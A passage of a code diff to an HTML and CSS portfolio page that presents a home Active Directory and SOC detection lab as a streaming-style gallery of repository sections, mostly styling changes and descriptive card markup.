+      top: 16px;
+      z-index: 2;
+      padding: 8px 12px;
+      border-radius: 999px;
+      font-size: 0.76rem;
+      color: var(--accent-2);
+      background: rgba(118, 167, 255, 0.1);
+      border: 1px solid rgba(168, 198, 255, 0.14);
+    }
+
+    .hero-slide-body {
+      padding: 18px;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      flex: 1;
+    }
+
+    .hero-slide-body h4 {
+      margin: 0;
+      font-size: 1.18rem;
+      letter-spacing: -0.02em;
+    }
+
+    .hero-slide-body p {
+      margin: 0;
+      color: var(--muted);
+      line-height: 1.65;
+      font-size: 0.95rem;
+    }
+
+    .hero-slide-tags {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 8px;
+    }
+
+    .hero-slide-list {
+      margin: 0;
+      padding-left: 18px;
+      color: var(--muted);
+      line-height: 1.65;
+      font-size: 0.92rem;
+    }
+
+    section { padding: 28px 0; }
+
+    .section-head {
+      display: flex;
+      justify-content: space-between;
+      align-items: end;
+      gap: 18px;
+      margin-bottom: 16px;
+    }
+
+    .section-head h2 {
+      margin: 0;
+      font-size: clamp(1.3rem, 2.4vw, 2rem);
+      letter-spacing: -0.03em;
+    }
+
+    .section-head p {
+      margin: 0;
+      color: var(--muted);
+      max-width: 60ch;
+      line-height: 1.65;
+    }
+
+    .row-wrap { position: relative; }
+
+    .scroller {
+      display: grid;
+      grid-auto-flow: column;
+      grid-auto-columns: minmax(280px, 340px);
+      gap: 18px;
+      overflow-x: auto;
+      padding-bottom: 12px;
+      scroll-snap-type: x proximity;
+      scrollbar-width: thin;
+    }
+
+    .card {
+      position: relative;
+      min-height: 220px;
+      border-radius: var(--radius);
+      overflow: hidden;
+      border: 1px solid rgba(168, 198, 255, 0.12);
+      background:
+        linear-gradient(180deg, rgba(17, 28, 48, 0.78), rgba(9, 16, 28, 0.96)),
+        radial-gradient(circle at top left, rgba(94, 140, 228, 0.24), transparent 34%);
+      box-shadow: var(--shadow);
+      scroll-snap-align: start;
+      transition: transform 0.28s ease, border-color 0.28s ease, box-shadow 0.28s ease;
+      isolation: isolate;
+      cursor: pointer;
+    }
+
+    .card:hover {
+      transform: translateY(-8px) scale(1.02);
+      border-color: rgba(168, 198, 255, 0.3);
+      box-shadow: 0 24px 55px rgba(0,0,0,0.52);
+      z-index: 10;
+    }
+
+    .card:focus-visible {
+      outline: 2px solid rgba(179, 208, 255, 0.9);
+      outline-offset: 3px;
+    }
+
+    .card-media {
+      height: 140px;
+      position: relative;
+      background:
+        linear-gradient(180deg, rgba(6, 10, 18, 0.08), rgba(6, 10, 18, 0.45)),
+        radial-gradient(circle at 20% 15%, rgba(124, 172, 255, 0.28), transparent 26%),
+        linear-gradient(135deg, #16223a, #0b1220);
+    }
+
+    .play {
+      position: absolute;
+      left: 18px;
+      top: 18px;
+      width: 54px;
+      height: 54px;
+      border-radius: 50%;
+      display: grid;
+      place-items: center;
+      background: rgba(248, 251, 255, 0.92);
+      color: #08101b;
+      font-size: 1.2rem;
+      font-weight: 800;
+      z-index: 2;
+    }
+
+    .card-body {
+      position: relative;
+      z-index: 2;
+      padding: 16px 18px 18px 18px;
+      min-height: 220px;
+      display: flex;
+      flex-direction: column;
+      justify-content: flex-start;
+    }
+
+    .meta {
+      display: flex;
+      gap: 8px;
+      flex-wrap: wrap;
+      margin-bottom: 10px;
+    }
+
+    .card h3 {
+      margin: 0 0 8px;
+      font-size: 1.14rem;
+    }
+
+    .card p {
+      margin: 0;
+      max-width: 28ch;
+      color: var(--muted);
+      line-height: 1.65;
+      font-size: 0.95rem;
+    }
+
+    .highlight-grid {
+      display: grid;
+      grid-template-columns: 1.2fr 0.8fr;
+      gap: 20px;
+      margin-top: 16px;
+    }
+
+    .panel {
+      border-radius: var(--radius);
+      padding: 22px;
+      background: linear-gradient(180deg, rgba(15, 26, 45, 0.88), rgba(10, 18, 31, 0.96));
+      border: 1px solid rgba(168, 198, 255, 0.12);
+      box-shadow: var(--shadow);
+    }
+
+    .timeline {
+      display: grid;
+      gap: 14px;
+    }
+
+    .step {
+      display: grid;
+      grid-template-columns: 46px 1fr;
+      gap: 14px;
+      align-items: start;
+    }
+
+    .step-num {
+      width: 46px;
+      height: 46px;
+      border-radius: 14px;
+      display: grid;
+      place-items: center;
+      font-weight: 800;
+      color: var(--text);
+      background: rgba(118, 167, 255, 0.12);
+      border: 1px solid rgba(168, 198, 255, 0.12);
+    }
+
+    .step h3, .panel h3 {
+      margin: 0 0 8px;
+      font-size: 1.08rem;
+    }
+
+    .step p, .panel p, .panel li {
+      margin: 0;
+      color: var(--muted);
+      line-height: 1.68;
+    }
+
+    .frame-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 14px;
+      margin-top: 16px;
+    }
+
+    .sample-frame {
+      min-height: 150px;
+      border-radius: 18px;
+      border: 1px solid rgba(168, 198, 255, 0.12);
+      background:
+        linear-gradient(180deg, rgba(8, 14, 24, 0.18), rgba(8, 14, 24, 0.96)),
+        radial-gradient(circle at top left, rgba(124, 172, 255, 0.22), transparent 34%),
+        linear-gradient(135deg, #101a2d, #09111e);
+      box-shadow: var(--shadow);
+      overflow: hidden;
+    }
+
+    .sample-frame-head {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 10px;
+      padding: 12px 14px;
+      border-bottom: 1px solid rgba(168, 198, 255, 0.1);
+      color: var(--accent-2);
+      font-size: 0.84rem;
+    }
+
+    .sample-dots {
+      display: flex;
+      gap: 6px;
+    }
+
+    .sample-dots span {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: rgba(179, 208, 255, 0.45);
+    }
+
+    .sample-frame-body {
+      padding: 14px;
+      color: var(--muted);
+      line-height: 1.6;
+      font-size: 0.92rem;
+    }
+
+    .sample-bars {
+      display: grid;
+      gap: 8px;
+    }
+
+    .sample-bars span {
+      display: block;
+      height: 10px;
+      border-radius: 999px;
+      background: linear-gradient(90deg, rgba(124, 172, 255, 0.34), rgba(124, 172, 255, 0.08));
+    }
+
+    .sample-bars span:nth-child(1) { width: 92%; }
+    .sample-bars span:nth-child(2) { width: 74%; }
+    .sample-bars span:nth-child(3) { width: 84%; }
+    .sample-bars span:nth-child(4) { width: 58%; }
+
+    .terminal {
+      margin-top: 14px;
+      background: rgba(3, 8, 16, 0.88);
+      border: 1px solid rgba(168, 198, 255, 0.12);
+      border-radius: 18px;
+      padding: 16px;
+      font-family: Consolas, Monaco, monospace;
+      line-height: 1.8;
+      color: #dce8ff;
+      font-size: 0.92rem;
+    }
+
+    .prompt { color: #89b6ff; }
+    .cmd { color: #fff; }
+
+    .gallery {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 16px;
+      margin-top: 16px;
+    }
+
+    .shot {
+      position: relative;
+      min-height: 170px;
+      border-radius: 20px;
+      overflow: hidden;
+      border: 1px solid rgba(168, 198, 255, 0.12);
+      background:
+        linear-gradient(180deg, rgba(8, 14, 24, 0.18), rgba(8, 14, 24, 0.94)),
+        radial-gradient(circle at top left, rgba(124, 172, 255, 0.24), transparent 34%),
+        linear-gradient(135deg, #121f36, #0a1221);
+      box-shadow: var(--shadow);
+      display: flex;
+      align-items: end;
+      padding: 16px;
+      color: var(--text);
+      cursor: pointer;
+    }
+
+    .shot::before {
+      content: "Preview";
+      position: absolute;
+      top: 12px;
+      right: 12px;
+      padding: 5px 9px;
+      border-radius: 999px;
+      font-size: 0.72rem;
+      color: var(--accent-2);
+      background: rgba(118, 167, 255, 0.1);
+      border: 1px solid rgba(168, 198, 255, 0.12);
+    }
+
+    .shot-label {
+      position: relative;
+      z-index: 1;
+    }
+
+    .modal {
+      position: fixed;
+      inset: 0;
+      z-index: 120;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      background: rgba(3, 7, 14, 0.78);
+      backdrop-filter: blur(10px);
+    }
+
+    .modal.is-open {
+      display: flex;
+    }
+
+    .modal-dialog {
+      width: min(920px, 100%);
+      max-height: 88vh;
+      overflow: auto;
+      border-radius: 24px;
+      border: 1px solid rgba(168, 198, 255, 0.14);
+      background: linear-gradient(180deg, rgba(14, 24, 41, 0.98), rgba(7, 12, 22, 0.99));
+      box-shadow: 0 28px 70px rgba(0,0,0,0.58);
+    }
+
+    .modal-hero {
+      height: 240px;
+      border-bottom: 1px solid rgba(168, 198, 255, 0.1);
+      background:
+        linear-gradient(180deg, rgba(8, 14, 24, 0.1), rgba(8, 14, 24, 0.82)),
+        radial-gradient(circle at top left, rgba(124, 172, 255, 0.26), transparent 30%),
+        linear-gradient(135deg, #16223a, #0b1220);
+    }
+
+    .modal-content {
+      padding: 22px;
+    }
+
+    .modal-top {
+      display: flex;
+      justify-content: space-between;
+      gap: 12px;
+      align-items: start;
+      margin-bottom: 14px;
+    }
+
+    .modal-close {
+      width: 42px;
+      height: 42px;
+      border-radius: 12px;
+      border: 1px solid rgba(168, 198, 255, 0.14);
+      background: rgba(255,255,255,0.04);
+      color: var(--text);
+      font-size: 1.1rem;
+      cursor: pointer;
+    }
+
+    .modal-close:hover {
+      background: rgba(255,255,255,0.08);
+    }
+
+    .modal-meta {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 8px;
+      margin: 12px 0 16px;
+    }
+
+    .modal-layout {
+      display: grid;
+      grid-template-columns: 1.15fr 0.85fr;
+      gap: 18px;
+    }
+
+    .modal-side {
+      border-radius: 18px;
+      border: 1px solid rgba(168, 198, 255, 0.12);
+      background: rgba(255,255,255,0.03);
+      padding: 16px;
+    }
+
+    .modal-side h4 {
+      margin: 0 0 10px;
+      font-size: 1rem;
+    }
+
+    .modal-side ul {
+      margin: 0;
+      padding-left: 18px;
+      color: var(--muted);
+      line-height: 1.7;
+    }
+
+    .footer {
+      padding: 32px 0 54px;
+      text-align: center;
+      color: var(--muted);
+      font-size: 0.92rem;
+    }
+
+    @media (max-width: 1100px) {
+      .hero-inner {
+        grid-template-columns: 1fr;
+      }
+
+      .hero-showcase {
+        padding-top: 0;
+      }
+
+      .hero-slider-shell {
+        min-height: 0;
+      }
+    }
+
+    @media (max-width: 1020px) {
+      .highlight-grid,
+      .gallery,
+      .frame-grid,
+      .modal-layout {
+        grid-template-columns: 1fr 1fr;
+      }
+    }
+
+    @media (max-width: 760px) {
+      .nav-inner, .section-head {
+        display: block;
+      }
+
+      .nav-links {
+        margin-top: 12px;
+        justify-content: flex-start;
+      }
+
+      .hero {
+        min-height: auto;
+      }
+
+      .hero-content,
+      .hero-showcase {
+        padding: 52px 0 24px;
+      }
+
+      .highlight-grid,
+      .gallery,
+      .frame-grid,
+      .modal-layout {
+        grid-template-columns: 1fr;
+      }
+
+      .hero-slider-track,
+      .scroller {
+        grid-auto-columns: minmax(260px, 86vw);
+      }
+
+      .modal {
+        padding: 10px;
+      }
+
+      .modal-dialog {
+        width: calc(100vw - 8px);
+        max-height: 92vh;
+      }
+
+      .modal-hero {
+        height: 170px;
+      }
+    }
+
+    @media (prefers-reduced-motion: reduce) {
+      *, *::before, *::after {
+        animation: none !important;
+        transition: none !important;
+        scroll-behavior: auto !important;
+      }
+    }
   </style>
 </head>
 <body>
@@ -1020,174 +892,157 @@ section {
     </div>
   </nav>
 
-<header class="hero">
-  <div class="container">
-    <div class="hero-inner">
-      <div class="hero-content">
-        <span class="eyebrow">Now Streaming: Enterprise AD • Detection Engineering • SOC Operations • Repository Walkthrough</span>
-        <h1>Enterprise AD + SOC Lab Repository Experience</h1>
-        <p>
-          A cinematic cybersecurity portfolio built around your real repository structure. This version turns the project into a Netflix-style browsing experience for docs, architecture, infrastructure build notes, detections, simulations, investigations, and SOC reporting using Wazuh, Security Onion, Sysmon, Suricata, Zeek, Kali, Linux, and Active Directory.
-        </p>
-        <div class="cta-row">
-          <a class="btn btn-primary" href="#simulations">▶ Browse Simulations</a>
-          <a class="btn btn-secondary" href="#docs">Open Repository Walkthrough</a>
-        </div>
-        <div class="hero-stats">
-          <div><strong>07</strong>repository lanes</div>
-          <div><strong>15+</strong>core project files</div>
-          <div><strong>06</strong>SOC content tracks</div>
-          <div><strong>Berlin</strong>junior SOC target roles</div>
-        </div>
-      </div>
-
-      <div class="hero-showcase">
-        <div class="hero-carousel-shell">
-          <div class="hero-slider-head">
-            <div>
-              <h3>Featured Repository Lanes</h3>
-              <p>Cycle through the main project storylines.</p>
-            </div>
-            <span class="pill">Hero Carousel</span>
+  <header class="hero">
+    <div class="container">
+      <div class="hero-inner">
+        <div class="hero-content">
+          <span class="eyebrow">Now Streaming: Enterprise AD • Detection Engineering • SOC Operations • Repository Walkthrough</span>
+          <h1>Enterprise AD + SOC Lab Repository Experience</h1>
+          <p>
+            A cinematic cybersecurity portfolio built around your real repository structure. This version turns the project into a Netflix-style browsing experience for docs, architecture, infrastructure build notes, detections, simulations, investigations, and SOC reporting using Wazuh, Security Onion, Sysmon, Suricata, Zeek, Kali, Linux, and Active Directory.
+          </p>
+          <div class="cta-row">
+            <a class="btn btn-primary" href="#simulations">▶ Browse Simulations</a>
+            <a class="btn btn-secondary" href="#docs">Open Repository Walkthrough</a>
           </div>
+          <div class="hero-stats">
+            <div><strong>07</strong>repository lanes</div>
+            <div><strong>15+</strong>core project files</div>
+            <div><strong>06</strong>SOC content tracks</div>
+            <div><strong>Berlin</strong>junior SOC target roles</div>
+          </div>
+        </div>
 
-          <div class="hero-carousel">
-            <button class="hero-carousel-btn prev" type="button" aria-label="Previous slide">‹</button>
-
-            <div class="hero-carousel-viewport">
-              <div class="hero-carousel-track" id="heroCarouselTrack">
-                <article class="hero-slide">
-                  <div class="hero-slide-media">
-                    <span class="hero-slide-badge">Docs</span>
-                  </div>
-                  <div class="hero-slide-body">
-                    <div class="hero-slide-tags">
-                      <span class="pill">Scope</span>
-                      <span class="pill">Inventory</span>
-                    </div>
-                    <h4>Project Scope & Mission</h4>
-                    <p>Overview of the lab purpose, objectives, learning outcomes, and recruiter-facing project summary.</p>
-                    <ul class="hero-slide-list">
-                      <li>What the lab demonstrates</li>
-                      <li>Main goals and outcomes</li>
-                      <li>Project positioning</li>
-                    </ul>
-                  </div>
-                </article>
-
-                <article class="hero-slide">
-                  <div class="hero-slide-media">
-                    <span class="hero-slide-badge">Architecture</span>
-                  </div>
-                  <div class="hero-slide-body">
-                    <div class="hero-slide-tags">
-                      <span class="pill">Zones</span>
-                      <span class="pill">Topology</span>
-                    </div>
-                    <h4>Architecture & Network Zones</h4>
-                    <p>Placeholder for topology diagrams, IP ranges, segmentation, and system relationships.</p>
-                    <ul class="hero-slide-list">
-                      <li>Attacker to sensor flow</li>
-                      <li>AD and monitored hosts</li>
-                      <li>Telemetry boundaries</li>
-                    </ul>
-                  </div>
-                </article>
-
-                <article class="hero-slide">
-                  <div class="hero-slide-media">
-                    <span class="hero-slide-badge">Infrastructure</span>
-                  </div>
-                  <div class="hero-slide-body">
-                    <div class="hero-slide-tags">
-                      <span class="pill">Windows</span>
-                      <span class="pill">Linux</span>
-                    </div>
-                    <h4>Infrastructure Build Sequence</h4>
-                    <p>Placeholder for VM prep, Windows Server, Ubuntu, Kali, Security Onion, Wazuh, and Docker setup.</p>
-                    <ul class="hero-slide-list">
-                      <li>Build order and dependencies</li>
-                      <li>Server and client preparation</li>
-                      <li>Monitoring stack deployment</li>
-                    </ul>
-                  </div>
-                </article>
-
-                <article class="hero-slide">
-                  <div class="hero-slide-media">
-                    <span class="hero-slide-badge">Detections</span>
-                  </div>
-                  <div class="hero-slide-body">
-                    <div class="hero-slide-tags">
-                      <span class="pill">Wazuh</span>
-                      <span class="pill">Sysmon</span>
-                    </div>
-                    <h4>Detection Engineering</h4>
-                    <p>Placeholder for Wazuh rules, Sysmon coverage, Sigma logic, and Security Onion hunts.</p>
-                    <ul class="hero-slide-list">
-                      <li>Custom detection rules</li>
-                      <li>Host telemetry coverage</li>
-                      <li>ATT&amp;CK-aligned detections</li>
-                    </ul>
-                  </div>
-                </article>
-
-                <article class="hero-slide">
-                  <div class="hero-slide-media">
-                    <span class="hero-slide-badge">Simulations</span>
-                  </div>
-                  <div class="hero-slide-body">
-                    <div class="hero-slide-tags">
-                      <span class="pill">Nmap</span>
-                      <span class="pill">Hydra</span>
-                    </div>
-                    <h4>Attack Simulations</h4>
-                    <p>Placeholder for reconnaissance, brute force, lateral movement, persistence, and Linux attack stories.</p>
-                    <ul class="hero-slide-list">
-                      <li>Reconnaissance and scans</li>
-                      <li>Authentication abuse</li>
-                      <li>Case-driven scenarios</li>
-                    </ul>
-                  </div>
-                </article>
-
-                <article class="hero-slide">
-                  <div class="hero-slide-media">
-                    <span class="hero-slide-badge">Investigations</span>
-                  </div>
-                  <div class="hero-slide-body">
-                    <div class="hero-slide-tags">
-                      <span class="pill">Cases</span>
-                      <span class="pill">Reports</span>
-                    </div>
-                    <h4>Incident Cases & Reports</h4>
-                    <p>Placeholder for SSH brute force case, Windows logon case, PowerShell case, and final reporting output.</p>
-                    <ul class="hero-slide-list">
-                      <li>Evidence review</li>
-                      <li>MITRE mapping</li>
-                      <li>SOC-style conclusions</li>
-                    </ul>
-                  </div>
-                </article>
+        <div class="hero-showcase">
+          <div class="hero-slider-shell">
+            <div class="hero-slider-head">
+              <div>
+                <h3>Featured Repository Lanes</h3>
+                <p>Scroll horizontally to preview the main project storylines.</p>
               </div>
+              <span class="pill">Hero Slider</span>
             </div>
 
-            <button class="hero-carousel-btn next" type="button" aria-label="Next slide">›</button>
-          </div>
+            <div class="hero-slider-track">
+              <article class="hero-slide">
+                <div class="hero-slide-media">
+                  <span class="hero-slide-badge">Docs</span>
+                </div>
+                <div class="hero-slide-body">
+                  <div class="hero-slide-tags">
+                    <span class="pill">Scope</span>
+                    <span class="pill">Inventory</span>
+                  </div>
+                  <h4>Project Scope & Mission</h4>
+                  <p>Overview of the lab purpose, objectives, learning outcomes, and recruiter-facing project summary.</p>
+                  <ul class="hero-slide-list">
+                    <li>What the lab demonstrates</li>
+                    <li>Main goals and outcomes</li>
+                    <li>Project positioning</li>
+                  </ul>
+                </div>
+              </article>
 
-          <div class="hero-carousel-dots" id="heroCarouselDots">
-            <button class="is-active" type="button" aria-label="Go to slide 1"></button>
-            <button type="button" aria-label="Go to slide 2"></button>
-            <button type="button" aria-label="Go to slide 3"></button>
-            <button type="button" aria-label="Go to slide 4"></button>
-            <button type="button" aria-label="Go to slide 5"></button>
-            <button type="button" aria-label="Go to slide 6"></button>
+              <article class="hero-slide">
+                <div class="hero-slide-media">
+                  <span class="hero-slide-badge">Architecture</span>
+                </div>
+                <div class="hero-slide-body">
+                  <div class="hero-slide-tags">
+                    <span class="pill">Zones</span>
+                    <span class="pill">Topology</span>
+                  </div>
+                  <h4>Architecture & Network Zones</h4>
+                  <p>Placeholder for topology diagrams, IP ranges, segmentation, and system relationships.</p>
+                  <ul class="hero-slide-list">
+                    <li>Attacker to sensor flow</li>
+                    <li>AD and monitored hosts</li>
+                    <li>Telemetry boundaries</li>
+                  </ul>
+                </div>
+              </article>
+
+              <article class="hero-slide">
+                <div class="hero-slide-media">
+                  <span class="hero-slide-badge">Infrastructure</span>
+                </div>
+                <div class="hero-slide-body">
+                  <div class="hero-slide-tags">
+                    <span class="pill">Windows</span>
+                    <span class="pill">Linux</span>
+                  </div>
+                  <h4>Infrastructure Build Sequence</h4>
+                  <p>Placeholder for VM prep, Windows Server, Ubuntu, Kali, Security Onion, Wazuh, and Docker setup.</p>
+                  <ul class="hero-slide-list">
+                    <li>Build order and dependencies</li>
+                    <li>Server and client preparation</li>
+                    <li>Monitoring stack deployment</li>
+                  </ul>
+                </div>
+              </article>
+
+              <article class="hero-slide">
+                <div class="hero-slide-media">
+                  <span class="hero-slide-badge">Detections</span>
+                </div>
+                <div class="hero-slide-body">
+                  <div class="hero-slide-tags">
+                    <span class="pill">Wazuh</span>
+                    <span class="pill">Sysmon</span>
+                  </div>
+                  <h4>Detection Engineering</h4>
+                  <p>Placeholder for Wazuh rules, Sysmon coverage, Sigma logic, and Security Onion hunts.</p>
+                  <ul class="hero-slide-list">
+                    <li>Custom detection rules</li>
+                    <li>Host telemetry coverage</li>
+                    <li>ATT&amp;CK-aligned detections</li>
+                  </ul>
+                </div>
+              </article>
+
+              <article class="hero-slide">
+                <div class="hero-slide-media">
+                  <span class="hero-slide-badge">Simulations</span>
+                </div>
+                <div class="hero-slide-body">
+                  <div class="hero-slide-tags">
+                    <span class="pill">Nmap</span>
+                    <span class="pill">Hydra</span>
+                  </div>
+                  <h4>Attack Simulations</h4>
+                  <p>Placeholder for reconnaissance, brute force, lateral movement, persistence, and Linux attack stories.</p>
+                  <ul class="hero-slide-list">
+                    <li>Reconnaissance and scans</li>
+                    <li>Authentication abuse</li>
+                    <li>Case-driven scenarios</li>
+                  </ul>
+                </div>
+              </article>
+
+              <article class="hero-slide">
+                <div class="hero-slide-media">
+                  <span class="hero-slide-badge">Investigations</span>
+                </div>
+                <div class="hero-slide-body">
+                  <div class="hero-slide-tags">
+                    <span class="pill">Cases</span>
+                    <span class="pill">Reports</span>
+                  </div>
+                  <h4>Incident Cases & Reports</h4>
+                  <p>Placeholder for SSH brute force case, Windows logon case, PowerShell case, and final reporting output.</p>
+                  <ul class="hero-slide-list">
+                    <li>Evidence review</li>
+                    <li>MITRE mapping</li>
+                    <li>SOC-style conclusions</li>
+                  </ul>
+                </div>
+              </article>
+            </div>
           </div>
         </div>
       </div>
     </div>
-  </div>
-</header>
+  </header>
 
   <section id="docs">
     <div class="container">
@@ -1197,38 +1052,57 @@ section {
       </div>
       <div class="row-wrap">
         <div class="scroller">
-          <button class="card modal-card" data-title="Project Scope" data-subtitle="docs/00-project-scope.md" data-description="High-level mission, goals, tooling boundaries, and what the enterprise lab is meant to demonstrate." data-details="project purpose|learning objectives|recruiter-facing summary|enterprise SOC lab goals" data-labels="docs/,00-project-scope.md">
+          <article class="card modal-card" tabindex="0"
+            data-title="Project Scope"
+            data-labels="docs/, 00-project-scope.md"
+            data-description="High-level mission, goals, tooling boundaries, and what the enterprise lab is meant to demonstrate."
+            data-details="Project purpose|Learning objectives|Recruiter-facing summary">
             <div class="card-media"><div class="play">▶</div></div>
             <div class="card-body">
               <div class="meta"><span class="pill">docs/</span><span class="pill">00-project-scope.md</span></div>
               <h3>Project Scope</h3>
               <p>High-level mission, goals, tooling boundaries, and what the enterprise lab is meant to demonstrate.</p>
             </div>
-          </button>
-          <button class="card modal-card" data-title="Lab Inventory" data-subtitle="docs/01-lab-inventory.md" data-description="VM list, host specs, network ranges, roles, sensors, and endpoint coverage in one quick view." data-details="shows planning depth|proves environment is real|great for interview explanation|supports architecture walkthrough" data-labels="docs/,01-lab-inventory.md">
+          </article>
+
+          <article class="card modal-card" tabindex="0"
+            data-title="Lab Inventory"
+            data-labels="docs/, 01-lab-inventory.md"
+            data-description="VM list, host specs, network ranges, roles, sensors, and endpoint coverage in one quick view."
+            data-details="Shows planning depth|Proves environment is real|Great for interview explanation">
             <div class="card-media"><div class="play">▶</div></div>
             <div class="card-body">
               <div class="meta"><span class="pill">docs/</span><span class="pill">01-lab-inventory.md</span></div>
               <h3>Lab Inventory</h3>
               <p>VM list, host specs, network ranges, roles, sensors, and endpoint coverage in one quick view.</p>
             </div>
-          </button>
-          <button class="card modal-card" data-title="Threat Model" data-subtitle="docs/04-threat-model.md" data-description="Adversary assumptions, attack paths, monitored assets, and priority detections mapped to your lab." data-details="shows security thinking|connects attacks to detections|supports ATT&CK mapping|explains monitoring priorities" data-labels="docs/,04-threat-model.md">
+          </article>
+
+          <article class="card modal-card" tabindex="0"
+            data-title="Threat Model"
+            data-labels="docs/, 04-threat-model.md"
+            data-description="Adversary assumptions, attack paths, monitored assets, and priority detections mapped to your lab."
+            data-details="Shows security thinking|Connects attacks to detections|Supports ATT&CK mapping">
             <div class="card-media"><div class="play">▶</div></div>
             <div class="card-body">
               <div class="meta"><span class="pill">docs/</span><span class="pill">04-threat-model.md</span></div>
               <h3>Threat Model</h3>
               <p>Adversary assumptions, attack paths, monitored assets, and priority detections mapped to your lab.</p>
             </div>
-          </button>
-          <button class="card modal-card" data-title="SOC Analyst Walkthrough" data-subtitle="docs/06-soc-analyst-walkthrough.md" data-description="Step-by-step analyst narrative from detection to evidence review, triage, and incident reporting." data-details="alert workflow|investigation storyline|manager-friendly structure|ideal for recruiter demos" data-labels="docs/,06-soc-analyst-walkthrough.md">
+          </article>
+
+          <article class="card modal-card" tabindex="0"
+            data-title="SOC Analyst Walkthrough"
+            data-labels="docs/, 06-soc-analyst-walkthrough.md"
+            data-description="Step-by-step analyst narrative from detection to evidence review, triage, and incident reporting."
+            data-details="Alert workflow|Investigation storyline|Manager-friendly structure">
             <div class="card-media"><div class="play">▶</div></div>
             <div class="card-body">
               <div class="meta"><span class="pill">docs/</span><span class="pill">06-soc-analyst-walkthrough.md</span></div>
               <h3>SOC Analyst Walkthrough</h3>
               <p>Step-by-step analyst narrative from detection to evidence review, triage, and incident reporting.</p>
             </div>
-          </button>
+          </article>
         </div>
       </div>
     </div>
@@ -1242,30 +1116,44 @@ section {
       </div>
       <div class="row-wrap">
         <div class="scroller">
-          <button class="card modal-card" data-title="Architecture Overview" data-subtitle="architecture/00-overview.md" data-description="Executive view of the full lab and how the blue-team stack receives host and network telemetry." data-details="topology summary|log flow|trust boundaries|blue-team monitoring map" data-labels="architecture/,00-overview.md">
+          <article class="card modal-card" tabindex="0"
+            data-title="Architecture Overview"
+            data-labels="architecture/, 00-overview.md"
+            data-description="Executive view of the full lab and how the blue-team stack receives host and network telemetry."
+            data-details="Topology summary|Log flow|Trust boundaries">
             <div class="card-media"></div>
             <div class="card-body">
               <div class="meta"><span class="pill">architecture/</span><span class="pill">00-overview.md</span></div>
               <h3>Architecture Overview</h3>
               <p>Executive view of the full lab and how the blue-team stack receives host and network telemetry.</p>
             </div>
-          </button>
-          <button class="card modal-card" data-title="Network Zones" data-subtitle="architecture/01-network-zones.md" data-description="Attacker segment, monitored servers, clients, IDS sensors, and management traffic broken into clean zones." data-details="zone diagram|IP ranges|traffic direction|segmentation logic" data-labels="architecture/,01-network-zones.md">
+          </article>
+
+          <article class="card modal-card" tabindex="0"
+            data-title="Network Zones"
+            data-labels="architecture/, 01-network-zones.md"
+            data-description="Attacker segment, monitored servers, clients, IDS sensors, and management traffic broken into clean zones."
+            data-details="Zone diagram|IP ranges|Traffic direction">
             <div class="card-media"></div>
             <div class="card-body">
               <div class="meta"><span class="pill">architecture/</span><span class="pill">01-network-zones.md</span></div>
               <h3>Network Zones</h3>
               <p>Attacker segment, monitored servers, clients, IDS sensors, and management traffic broken into clean zones.</p>
             </div>
-          </button>
-          <button class="card modal-card" data-title="System Relationships" data-subtitle="architecture/02-system-relationships.md" data-description="Domain controller, Windows client, Ubuntu, Kali, Security Onion, and Wazuh relationships in one path." data-details="infrastructure awareness|AD understanding|monitoring design|system dependency map" data-labels="architecture/,02-system-relationships.md">
+          </article>
+
+          <article class="card modal-card" tabindex="0"
+            data-title="System Relationships"
+            data-labels="architecture/, 02-system-relationships.md"
+            data-description="Domain controller, Windows client, Ubuntu, Kali, Security Onion, and Wazuh relationships in one path."
+            data-details="Infrastructure awareness|AD understanding|Monitoring design">
             <div class="card-media"></div>
             <div class="card-body">
               <div class="meta"><span class="pill">architecture/</span><span class="pill">02-system-relationships.md</span></div>
               <h3>System Relationships</h3>
               <p>Domain controller, Windows client, Ubuntu, Kali, Security Onion, and Wazuh relationships in one path.</p>
             </div>
-          </button>
+          </article>
         </div>
       </div>
     </div>
@@ -1279,38 +1167,57 @@ section {
       </div>
       <div class="row-wrap">
         <div class="scroller">
-          <button class="card modal-card" data-title="Build Order" data-subtitle="infrastructure/00-build-order.md" data-description="The full deployment sequence so the project looks repeatable and professionally planned." data-details="phase order|dependencies|bootstrapping logic|deployment sequence" data-labels="infrastructure/,00-build-order.md">
+          <article class="card modal-card" tabindex="0"
+            data-title="Build Order"
+            data-labels="infrastructure/, 00-build-order.md"
+            data-description="The full deployment sequence so the project looks repeatable and professionally planned."
+            data-details="Phase order|Dependencies|Bootstrapping logic">
             <div class="card-media"></div>
             <div class="card-body">
               <div class="meta"><span class="pill">infrastructure/</span><span class="pill">00-build-order.md</span></div>
               <h3>Build Order</h3>
               <p>The full deployment sequence so the project looks repeatable and professionally planned.</p>
             </div>
-          </button>
-          <button class="card modal-card" data-title="Windows Server 2025" data-subtitle="infrastructure/03-windows-server-2025.md" data-description="Domain services, DNS, baseline configuration, and security context for the enterprise side of the lab." data-details="AD DS role|DNS setup|server baseline|enterprise server context" data-labels="infrastructure/,03-windows-server-2025.md">
+          </article>
+
+          <article class="card modal-card" tabindex="0"
+            data-title="Windows Server 2025"
+            data-labels="infrastructure/, 03-windows-server-2025.md"
+            data-description="Domain services, DNS, baseline configuration, and security context for the enterprise side of the lab."
+            data-details="AD DS role|DNS setup|Server baseline">
             <div class="card-media"></div>
             <div class="card-body">
               <div class="meta"><span class="pill">infrastructure/</span><span class="pill">03-windows-server-2025.md</span></div>
               <h3>Windows Server 2025</h3>
               <p>Domain services, DNS, baseline configuration, and security context for the enterprise side of the lab.</p>
             </div>
-          </button>
-          <button class="card modal-card" data-title="Security Onion" data-subtitle="infrastructure/07-security-onion.md" data-description="IDS setup, sensor placement, hunting interface, and how network detections enter the analyst workflow." data-details="Suricata + Zeek|alert validation|sensor visibility|hunt workflow" data-labels="infrastructure/,07-security-onion.md">
+          </article>
+
+          <article class="card modal-card" tabindex="0"
+            data-title="Security Onion"
+            data-labels="infrastructure/, 07-security-onion.md"
+            data-description="IDS setup, sensor placement, hunting interface, and how network detections enter the analyst workflow."
+            data-details="Suricata + Zeek|Alert validation|Sensor visibility">
             <div class="card-media"></div>
             <div class="card-body">
